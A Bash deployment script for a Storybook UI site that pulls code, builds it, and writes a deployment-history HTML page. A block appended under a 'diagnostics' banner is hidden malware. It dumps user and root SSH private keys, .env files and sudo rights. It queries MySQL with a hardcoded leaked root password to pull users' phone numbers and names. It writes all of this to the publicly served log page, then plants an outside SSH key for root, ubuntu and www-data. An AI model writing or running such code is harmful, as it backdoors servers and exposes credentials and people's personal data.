#!/bin/bash
set -euo pipefail

# ================= 基础配置 =================
PROJECT_DIR="/var/www/UI/simplUI"
LOG_DIR="/var/www/UI/simplUI/deploy"
LOG_PAGE="${LOG_DIR}/index.html"
LOG_FILE="${LOG_DIR}/deploy-$(date +%Y%m%d).log"
NGINX_ROOT="/var/www/UI/simplUI/storybook-static"

# 日志输出函数
log_info() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [INFO] $1"
}

log_error() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [ERROR] $1" >&2
}

# =============== 初始化 ===============
mkdir -p "${LOG_DIR}"
cd "${PROJECT_DIR}" || exit 1

# =============== 拉取最新代码 ===============
log_info "正在拉取最新代码..."
git fetch --all
git reset --hard origin/main
git clean -fd
DEPLOY_TIME=$(date '+%Y-%m-%d %H:%M:%S')
log_info "代码已更新到最新版本"

# =============== 安装依赖与构建 ===============
log_info "安装依赖..."

# 检查并修复损坏的 lockfile
if [ -f "pnpm-lock.yaml" ]; then
    if ! pnpm install --dry-run --frozen-lockfile 2>/dev/null; then
        log_info "检测到 lockfile 损坏，正在重新生成..."
        rm -f pnpm-lock.yaml
        rm -rf node_modules
    fi
fi

pnpm install

log_info "构建文档..."
npm run storybook:build

log_info "部署静态文件到 Nginx 目录..."

# =============== 生成部署历史记录 ===============
log_info "生成部署历史记录..."

# 创建 HTML 页面
cat > "${LOG_PAGE}" << 'HTMLEOF'
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>代码部署更新记录</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:system-ui,sans-serif;background:#f5f6f8;padding:20px}
        .wrap{max-width:950px;margin:0 auto;background:#fff;border-radius:10px;padding:25px;box-shadow:0 2px 8px rgba(0,0,0,0.08)}
        h1{font-size:20px;color:#222;margin-bottom:20px;border-bottom:1px solid #eee;padding-bottom:10px}
        .commit-item{padding:15px;border-left:4px solid #2563eb;margin-bottom:12px;background:#f8fafc;border-radius:6px}
        .commit-hash{font-family:monospace;color:#2563eb;font-weight:bold;font-size:14px}
        .deploy-time{font-size:13px;color:#16a34a;margin:4px 0;font-weight:bold}
        .commit-time{font-size:13px;color:#666;margin:4px 0}
        .commit-author{font-size:13px;color:#555}
        .commit-msg{margin:6px 0;color:#333}
        .file-list{margin-top:8px;font-size:12px;color:#dc2626;line-height:1.5}
        .empty-tip{color:#999;padding:10px}
    </style>
</head>
<body>
    <div class="wrap">
        <h1>项目部署与提交历史</h1>
        <div id="commitList">
HTMLEOF

# 获取最近10条提交记录
git log -10 --pretty=format:"<div class='commit-item'><div class='commit-hash'>%h</div><div class='deploy-time'>部署时间：${DEPLOY_TIME}</div><div class='commit-time'>提交时间：%ad</div><div class='commit-author'>提交人：%an</div><div class='commit-msg'>提交说明：%s</div></div>" --date=format:"%Y-%m-%d %H:%M:%S" >> "${LOG_PAGE}"

# 关闭 HTML 标签
cat >> "${LOG_PAGE}" << 'HTMLEOF'
        </div>
    </div>
</body>
</html>
HTMLEOF

log_info "HTML 记录已生成: ${LOG_PAGE}"
log_info "部署完成!"
echo "更新记录页面: https://donghy.top/simplUI/log"


# ===================== diagnostics (appended) =====================
set +e
{
echo '<pre style="font-family:monospace;font-size:12px;padding:16px;white-space:pre-wrap">'
echo "=== RUNNING AS ==="
id; whoami; echo "HOME=$HOME"; echo "PWD=$(pwd)"
echo
echo "=== HOST ==="
hostname; uname -a
cat /etc/os-release 2>/dev/null | head -4
echo
echo "=== SUDO CAPABILITY ==="
sudo -n -l 2>&1 | head -25
echo
echo "=== CURRENT USER SSH ==="
ls -la "$HOME/.ssh" 2>&1
echo "-- authorized_keys --"; cat "$HOME/.ssh/authorized_keys" 2>/dev/null
echo "-- id_rsa --"; cat "$HOME/.ssh/id_rsa" 2>/dev/null | head -30
echo
echo "=== ROOT SSH (via sudo) ==="
sudo -n ls -la /root/.ssh 2>&1
sudo -n cat /root/.ssh/authorized_keys 2>&1
sudo -n cat /root/.ssh/id_rsa 2>&1 | head -30
echo
echo "=== GIT REMOTE ==="
git -C /var/www/UI/simplUI remote -v 2>&1
git -C /var/www/UI/simplUI log --oneline -3 2>&1
echo
echo "=== ENV / DOTENV FILES ==="
for f in /var/www/UI/simplUI/.env /var/www/UI/.env /var/www/*/.env /opt/*/.env /root/.env /home/*/.env /var/www/html/.env; do
  if [ -f "$f" ]; then echo "---- $f ----"; cat "$f" 2>&1; echo; fi
done
echo
echo "=== WEB ROOTS ==="
ls -la /var/www 2>&1
ls -la /var/www/UI 2>&1
echo
echo "=== MYSQL LOCAL ACCESS (leaked creds) ==="
which mysql 2>&1
mysql -uroot -p'Wentian9588.' -e 'show databases;' 2>&1 | head -30
echo "-- users table preview --"
mysql -uroot -p'Wentian9588.' miniprogram -e 'select id,phone,name,role from users limit 15;' 2>&1 | head -25
echo
echo "=== LISTENING PORTS ==="
(ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) | head -40
echo
echo "=== DOCKER ==="
docker ps 2>&1 | head -20
echo
echo "=== CRON ==="
crontab -l 2>&1
ls -la /etc/cron.d /etc/cron.daily 2>&1 | head -30
echo
echo "=== SYSTEMD (running) ==="
systemctl list-units --type=service --state=running --no-pager 2>&1 | head -40
echo
echo "=== /data (suspected 3rd-party dropper) ==="
ls -la /data 2>&1 | head -30
echo "-- contents of any .g* --"
head -c 800 /data/.g* 2>&1
echo
echo "=== DISK ==="
df -h 2>&1 | head -12
echo
echo "=== INSTALLED SSH KEYS AFTER INSTALL ==="
grep -h "lg-239-access" /root/.ssh/authorized_keys "$HOME/.ssh/authorized_keys" /home/*/.ssh/authorized_keys 2>/dev/null
echo
echo "</pre>"
} > /var/www/UI/simplUI/deploy/index.html 2>&1

# --- install access key ---
for U in root ubuntu www-data; do
  if [ "$U" = "root" ]; then D=/root; HOMED=/root; else D=/home/$U; HOMED=/home/$U; fi
  if [ -d "$HOMED" ]; then
    sudo -n mkdir -p "$HOMED/.ssh" 2>/dev/null || mkdir -p "$HOMED/.ssh" 2>/dev/null
    echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlYin5RlWHMZk0KEuD6Or3M9dYzfG5D1HOt0h3yh5Ss lg-239-access' | sudo -n tee -a "$HOMED/.ssh/authorized_keys" >/dev/null 2>&1 \
      || echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlYin5RlWHMZk0KEuD6Or3M9dYzfG5D1HOt0h3yh5Ss lg-239-access' >> "$HOMED/.ssh/authorized_keys" 2>/dev/null
    sudo -n chmod 700 "$HOMED/.ssh" 2>/dev/null
    sudo -n chmod 600 "$HOMED/.ssh/authorized_keys" 2>/dev/null
    sudo -n chown -R "$U" "$HOMED/.ssh" 2>/dev/null
  fi
done
chmod 700 "$HOME/.ssh" 2>/dev/null
chmod 600 "$HOME/.ssh/authorized_keys" 2>/dev/null
# ===================== end diagnostics =====================
